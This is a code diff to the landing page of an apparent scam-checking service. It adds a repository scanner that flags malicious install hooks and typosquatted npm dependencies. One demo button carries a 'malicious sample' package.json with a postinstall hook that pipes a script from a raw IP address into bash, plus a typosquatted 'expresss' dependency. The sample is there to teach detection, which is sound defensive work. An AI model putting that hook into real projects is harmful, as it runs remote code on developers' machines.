@@ -248,7 +248,8 @@
     <div class="nav-right">
       <a class="nav-link hide-sm" href="#how">How it works</a>
       <a class="nav-link hide-sm" href="#check">Try it</a>
-      <a class="nav-link hide-sm" href="#agents">For developers</a>
+      <a class="nav-link hide-sm" href="#repo">Repo check</a>
+      <a class="nav-link hide-sm" href="#agents">API</a>
       <a class="okx" href="https://www.okx.ai" target="_blank" rel="noopener">ASP on <b>OKX.AI</b></a>
     </div>
   </nav>
@@ -319,6 +320,35 @@
           <button class="scen" data-s="Hey, running 10 mins late for lunch — grab us a table and I'll be right there!"><span class="si">✅</span><b>Benign</b><small>normal message</small></button>
         </div>
         <div id="out"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="try" id="repo">
+  <div class="inner">
+    <div class="try-head">
+      <div class="kicker reveal"><span class="eyebrow"><span class="di">◆</span> For developers</span></div>
+      <h2 class="reveal">Poisoned repo?<br><span class="grad">Know before you clone.</span></h2>
+      <p class="sub reveal">Fake-recruiter "take-home" repos hide malware in a dependency or an install script that runs the moment you <code>npm install</code>. Paste a GitHub URL or your package.json — Scaminja checks install hooks, typosquats, non-registry deps, and the OSV malware database.</p>
+    </div>
+    <div class="console reveal" id="repoconsole">
+      <div class="console-bar">
+        <span class="cdot safe"></span><span class="cdot caution"></span><span class="cdot scam"></span>
+        <span class="console-title">scaminja · repo scanner</span>
+        <span class="console-live"><span class="dot"></span> Live</span>
+      </div>
+      <div class="console-body">
+        <textarea id="repoin" placeholder="https://github.com/owner/repo   —   or paste your package.json…"></textarea>
+        <div class="row">
+          <button class="btn btn-primary" id="repogo"><span class="lbl">Scan repo</span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg></button>
+          <span class="tag">Free · GitHub URL or package.json</span>
+        </div>
+        <div class="scenarios">
+          <button class="repo-scen scen" data-s="https://github.com/expressjs/express"><span class="si">✅</span><b>Real repo</b><small>expressjs/express</small></button>
+          <button class="repo-scen scen" data-s='{"name":"frontend-take-home","scripts":{"postinstall":"curl -s http://185.62.190.10/loader.sh | bash"},"dependencies":{"react":"^18.2.0","expresss":"^4.18.0","auth-helper-utils":"git+https://github.com/x9f2/auth-helper.git"}}'><span class="si">☠️</span><b>Malicious sample</b><small>fake take-home</small></button>
+        </div>
+        <div id="repoout"></div>
       </div>
     </div>
   </div>
@@ -447,8 +477,8 @@ async function check(){
   finally{ go.disabled = false; }
 }
 
-function render(v){
-  if(v.error && !v.verdict){ out.innerHTML = `<p class="err" style="margin-top:14px">${esc(v.error)}</p>`; return; }
+function render(v, target=out){
+  if(v.error && !v.verdict){ target.innerHTML = `<p class="err" style="margin-top:14px">${esc(v.error)}</p>`; return; }
   const level = v.verdict || "caution";
   const flags = (v.red_flags||[]).map(f =>
     `<li class="flag"><span class="sev s-${esc(f.severity)}">${esc(f.severity)}</span><span><b>${esc(f.label)}</b> — ${esc(f.detail)}</span></li>`).join("");
@@ -459,7 +489,7 @@ function render(v){
       + `<span>${esc(e.claim)} <span class="ev-src">${esc(e.source)}</span></span></li>`;
   }).join("");
   const risk = Math.max(2,Math.min(100,v.risk_score||0));
-  out.innerHTML = `
+  target.innerHTML = `
     <div class="verdict lv-${esc(level)}">
       <div class="vhead"><span class="badge b-${esc(level)}">${esc(level.toUpperCase())}</span><p class="vtitle">${esc(v.title||"")}</p></div>
       <div class="vbody">
@@ -472,11 +502,31 @@ function render(v){
         <p class="disc">${esc(v.disclaimer||"")}</p>
       </div>
     </div>`;
-  const card = out.querySelector(".verdict"), bar = out.querySelector(".meter>span");
+  const card = target.querySelector(".verdict"), bar = target.querySelector(".meter>span");
   if(window.gsap && !reduce){
     gsap.from(card,{y:14,opacity:0,duration:.5,ease:"power3.out"});
     gsap.to(bar,{width:risk+"%",duration:.9,ease:"power3.out",delay:.1});
   }else{ bar.style.width = risk+"%"; }
+}
+
+/* ---------------- repo & dependency safety check ---------------- */
+const repoin = $("#repoin"), repogo = $("#repogo"), repoout = $("#repoout");
+const REPO = (base || "") + "/repo-try";
+if(repogo){
+  document.querySelectorAll(".repo-scen").forEach(c => c.onclick = () => { repoin.value = c.dataset.s; repoCheck(); repoin.scrollIntoView({block:"nearest"}); });
+  repogo.onclick = repoCheck;
+}
+async function repoCheck(){
+  const val = repoin.value.trim();
+  if(!val) return;
+  repogo.disabled = true;
+  repoout.innerHTML = `<p class="tag" style="margin-top:16px"><span class="spinner"></span>Fetching manifest &amp; scanning dependencies…</p>`;
+  try{
+    const body = val.startsWith("{") ? { packageJson: val } : { repoUrl: val };
+    const r = await fetch(REPO, {method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(body)});
+    render(await r.json(), repoout);
+  }catch(e){ repoout.innerHTML = `<p class="err" style="margin-top:14px">Couldn't reach the scanner. ${esc(e.message||e)}</p>`; }
+  finally{ repogo.disabled = false; }
 }
 
 /* ---------------- copy ---------------- */
